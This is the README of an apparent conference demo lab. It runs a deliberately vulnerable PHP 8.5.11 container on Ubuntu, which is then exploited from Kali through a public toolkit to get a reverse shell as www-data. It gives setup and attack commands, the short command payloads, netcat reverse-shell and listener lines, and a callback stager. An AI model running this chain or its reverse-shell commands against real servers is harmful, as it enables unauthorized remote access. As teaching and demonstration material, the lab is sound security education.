# PHP2Shell — Ubuntu Server 24.04 + Kali lab

Vulnerable target (PHP 8.5.11, mod_php) running a ~180-line application —
mostly HTML — **without a single vulnerable line**, and the attack launched
from Kali ending in a **reverse shell as `www-data`**.

> Rehearsing on the event network? `docs/RUNBOOK-lab-topology.md` gives the
> **clone → attack** walkthrough for the target `192.0.2.20` and the Kali box
> `192.0.2.10`, with the expected output of each command.

```
   ┌──────────────────────────────┐            ┌───────────────────────────┐
   │  Ubuntu Server 24.04.4       │            │  Kali Linux               │
   │  192.0.2.20                │            │  192.0.2.10             │
   │                              │  HTTP 8080 │                           │
   │  Apache prefork (1 worker)   │◄───────────┤  php2shell_auto.py        │
   │  PHP 8.5.11 (vulnerable)     │            │  (arm → probe → leak →    │
   │  /var/www/html  (Photo Drop) │            │   control)                │
   │                              │            │                           │
   │  www-data ────── reverse shell ──────────►│  nc -lvnp 4444            │
   └──────────────────────────────┘   TCP 4444 └───────────────────────────┘
```

---

## Requirements

### Ubuntu Server 24.04.4 (the target)

Minimal install ("nothing extra"), with OpenSSH so you can copy the files over.

| Item | Minimum | Note |
|------|--------|------|
| vCPU | 2 | 1 works; Apache runs a single worker on purpose |
| RAM | 2 GB | the chain sends large bodies (512 MB of `post_max_size`) |
| Disk | 10 GB | PHP image ~500 MB + Docker layers |
| Network | bridge, on the same network as Kali | **NAT isolates**: the reverse shell does not come back |
| Ports | 8080/tcp (target), 22/tcp (ssh) | 80 works too, change it with `--port` |
| Access | `sudo` (root) | the installer installs Docker and adjusts permissions |
| Internet | once, to pull the image | after that the lab runs offline |

Software installed by `install.sh` itself: `docker.io`, `docker-compose-v2`,
`curl`. No PHP, Apache or MySQL on the host — everything lives in the container.

### Kali Linux (the attacker)

| Item | Note |
|------|------|
| `git`, `python3` **3.11+** | the current Kali release is enough; the toolkit requires 3.11 |
| `ncat`, `rlwrap` | `setup-kali.sh` installs them if missing |
| Internet | once, to clone the toolkit and download the pinned upstream |

The toolkit in use (`devploit/php2shell`) is third-party and is **not** bundled
in this repository; `kali/setup-kali.sh` clones and prepares it. Without
internet on the day, copy the toolkit directory and use
`./kali/setup-kali.sh --from /path/php2shell`.

### Network (the thing that breaks demos most)

* Both VMs on the **same network** (bridge), fixed IPs or DHCP reservations.
* Test it first: `ping <kali>` on Ubuntu and `curl http://<ubuntu>:8080/` on Kali.
* Event Wi-Fi with *client isolation* kills the reverse shell. Bring a cable/AP.

---

## Why Docker, and not `apt install php`

* Exploiting a use-after-free depends on the **binary offsets** and the
  **heap layout** of that exact build.
* The public toolkit has a **verified** profile for `php:8.5.11-apache`
  (`php-8.5.11-bookworm-amd64`), with RCE confirmed as `uid=33(www-data)`.
* Ubuntu 24.04 ships PHP **8.3** in the repositories — a different build, with
  no published profile, and the toolkit itself records that 8.3 has no
  verified stage 3.
* Building 8.5.11 from source on Ubuntu produces a different `libphp.so`
  (different build prefix, different heap) and would require recalibration.

In other words: the container runs **inside** Ubuntu, with the same application,
and that is what makes the demo deterministic. The "target" is still your Ubuntu
VM — Apache, PHP and `www-data` belong to the container.

---

## Step 1 — copy to Ubuntu

From your host:

```bash
scp -r ubuntu-lab r19@192.0.2.20:~/
```

Or clone the repository directly on the VM and enter the `ubuntu-lab/` directory.

## Step 2 — install on Ubuntu

> **Blank** machine, no Docker and no git? The complete walkthrough (Docker,
> offline, firewall, Kali) is in **[`docs/INSTALL.md`](docs/INSTALL.md)**.
> This section is the summary.

```bash
cd ~/ubuntu-lab
chmod +x install.sh uninstall.sh verify.sh kali/*.sh   # if it came from a zip/Windows
sudo ./install.sh --lhost 192.0.2.10                 # Kali IP
```

Options: `--lhost <kali-ip>` (required), `--lport 4444`, `--port 8080`.
Running it again with a different `--lhost` only rewrites the stager — it is
idempotent.

The installer, in order:

1. checks root, Ubuntu and the architecture (`amd64`/`aarch64`);
2. installs `docker.io` + `docker-compose-v2` (if missing) and starts the daemon;
3. pulls `php:8.5.11-apache`;
4. prepares `storage/`, `app/stage/` and writes the **stager** with the Kali IP;
5. brings the container up (port published in `docker/.env`);
6. opens the port in `ufw`, if it is active;
7. runs `verify.sh` and prints the demo commands.

## Step 3 — verify

```bash
sudo ./verify.sh
```

Expected:

```
  ok    victim container is running
  ok    home page answering (Photo Drop)
  ok    ping.php: php=8.5.11 sapi=apache2handler arch=amd64 pid=41
  ok    vulnerable version (8.5.11)
  ok    two requests served by the SAME process (pid=41)
  ok    docroot writable by www-data (needed for the id>p1 proof)
  ok    storage writable by www-data (application uploads)
  ok    apache-lab.conf mounted (ServerLimit 1, MaxRequestWorkers 1)
  ok    session.upload_progress.prefix is the default (upload_progress_)
  ok    session.upload_progress.name is the default (PHP_SESSION_UPLOAD_PROGRESS)
  ok    upload_progress enabled and session.use_strict_mode=0
  ok    memory_limit=8M, display_errors=On, post_max_size=512M
  ok    stager: app/stage/s -> 192.0.2.10:4444

  All good. Target ready for the demo.
```

If something fails, `docs/TROUBLESHOOTING.md` has the matching entry.

## Step 4 — prepare Kali

```bash
cd ~/ubuntu-lab        # the same directory, copied to Kali
sudo ./kali/setup-kali.sh
```

This clones the toolkit into `~/tools/php2shell`, downloads the pinned upstream
(`9bie/php2shell-bypass-aslr-exp`, commit `4586f5c`) and lists the profiles with
verified RCE.

## Step 5 — the demo

Two terminals on Kali. **Listener first:**

```bash
./kali/p2s-listen.sh --lport 4444
```

Then the trigger:

```bash
./kali/p2s-run.sh --target http://192.0.2.20:8080 --step proof   # id>p1
./kali/p2s-run.sh --target http://192.0.2.20:8080 --step shell   # sh stage/s
```

Without `--step` it runs both, with a pause in between. `--dry-run` rehearses
without firing. The script performs a pre-flight check (version, arch, same
`pid` on both requests), detects the architecture from `/ping.php` and picks the
profile on its own.

The `shell` step **does not** use the toolkit verdict: `system()` returns no
body, so the toolkit always ends with `EXPLOIT_FAILED (no proof...)`, even when
the shell opens. The driver reads the stager log (`/p2s-stage.log`) and prints
its own result — `SHELL OK`, `CALLBACK REFUSED`, `RCE OK · CALLBACK NOT
CONFIRMED`, `BLIND STEP (old stager)`, `UNDEFINED` or `NOT EXECUTED`
(full table in `docs/TROUBLESHOOTING.md` §9). Red only when there is proof that
nothing ran.

Before going on stage, one command checks the state of the target (without
exploiting it):

```bash
./kali/p2s-diag3.py --target http://192.0.2.20:8080
```

Full script, with timing and plan B: `docs/TALK-DEMO.md`. Step-by-step for the
two machines: `docs/RUNBOOK-lab-topology.md`.

---

## How the chain works (and why the commands are short)

The execution primitive carries **at most 14 bytes** of command:

| Command | Bytes | Fits? | What for |
|---------|-------|-------|----------|
| `id>p1` | 5 | yes | proof of execution (file served over HTTP) |
| `sh stage/s` | 10 | yes | fires the reverse shell stager |
| `nc 192.0.2.10 4444` | 21 | no | a classic reverse shell does not fit |

The `app/stage/s` that `install.sh` writes into the docroot exists for that
reason: it is the **payload**, not the exploit. It backgrounds bash and exits
immediately (the worker has to stay free) and records what it did in
`/tmp/p2s-stager.log` and in `/var/www/html/p2s-stage.log` — the second one is
public, and it is what gives the driver proof of execution when `system()`
returns no body.

The application in `app/` has no `eval`, no dynamic `include`, no `shell_exec`,
no `unserialize` and no `session_start()`. The bug is in the engine, before the
script is compiled — which is exactly the point of the talk.

## Layout

```
ubuntu-lab/
├── install.sh              # installs and brings everything up (Ubuntu, root)
├── verify.sh               # checks the target is ready for the demo
├── uninstall.sh            # tears down (--purge deletes stager and storage)
├── app/                    # Photo Drop (docroot mounted in the container)
│   ├── index.php  upload.php  download.php  config.php
│   ├── ping.php            # diagnostics: pid, version, arch (P2S_DEBUG=1)
│   ├── assets/app.css
│   └── stage/s             # GENERATED by install.sh: stager with the Kali IP
├── docker/
│   ├── docker-compose.yml  # php:8.5.11-apache, port 8080, P2S_DEBUG=1
│   ├── php.ini             # chain preconditions (memory_limit 8M etc.)
│   └── apache-lab.conf     # prefork with 1 worker + KeepAlive Off
├── kali/
│   ├── setup-kali.sh       # clones the toolkit and downloads the pinned upstream
│   ├── p2s-listen.sh       # reverse shell listener
│   ├── p2s-run.sh          # driver: proof / shell (+ its own verdict)
│   ├── p2s-diag3.py        # target diagnostics in 5 s (before the demo)
│   └── p2s-stage1-probe.py # re-measures the stage 1 geometry and saves it to the profile
└── docs/
    ├── INSTALL.md          # from scratch: blank Ubuntu + Docker + Kali
    ├── RUNBOOK-lab-topology.md  # clone → attack, on both machines
    ├── TALK-DEMO.md        # script with timing, talking points and plan B
    └── TROUBLESHOOTING.md  # 11 symptoms with a quick test
```

## Tear down

```bash
sudo ./uninstall.sh --purge
```

Do this **before** plugging the VM into any network other than the event one:
the stager in `app/stage/s` is a working reverse shell waiting for an IP.

## What this lab does not prove

* It is **not** an independent reproduction of the CVE: it uses the verified
  profile from the public toolkit for the `php:8.5.11-apache` image.
* It does **not** represent production: `display_errors=On`, `memory_limit=8M`,
  a writable docroot and 1 worker are lab preconditions, all listed in
  `docker/php.ini` and `docker/apache-lab.conf`.
* It is **not** a webshell: no `.php` file is uploaded. `id>p1` writes text
  without an executable extension and the rest of the path is the stager that
  **you** planted.
